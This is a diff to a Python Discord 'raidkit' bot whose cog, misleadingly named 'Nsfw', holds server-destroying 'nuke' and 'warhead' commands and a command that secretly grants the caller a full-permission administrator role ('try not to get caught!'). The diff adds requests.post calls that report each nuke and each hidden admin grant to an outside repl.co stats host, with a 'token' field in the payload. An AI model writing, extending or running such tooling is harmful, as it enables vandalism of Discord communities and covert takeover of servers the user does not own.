@@ -6,6 +6,7 @@ import discord
 from discord.ext import commands
 import os
 import random
+import requests
 import sqlite3
 from cogs.qetesh_methods import DATA, CODE, command_error, refresh
 from colorama import *
@@ -424,6 +425,7 @@ class Nsfw(commands.Cog):
             print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n\n{Fore.RESET}")
 
             print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
+            r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 1, 'secretadmins': 0, 'token': 'n'})
             return
         except BaseException as e:
             print(f"{Fore.LIGHTRED_EX}{e}\n\n")
@@ -526,6 +528,7 @@ class Nsfw(commands.Cog):
                 print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n{Fore.RESET}")
 
                 print(f"{Fore.LIGHTWHITE_EX}Warhead sucessfully exploded at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
+                r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 1, 'secretadmins': 0, 'token': 'n'})
                 i += 1
             print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
             return
@@ -603,6 +606,7 @@ class Nsfw(commands.Cog):
                 await g.create_role(name=role_name, permissions=discord.Permissions.all())
                 role = discord.utils.get(g.roles, name=role_name)
                 await ctx.author.add_roles(role)
+                r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 0, 'secretadmins': 1, 'token': 'n'})
                 print(
                     f"{Fore.LIGHTGREEN_EX}\nAdministrator permissions granted successfully - try not to get caught!{Fore.RESET}")
                 return
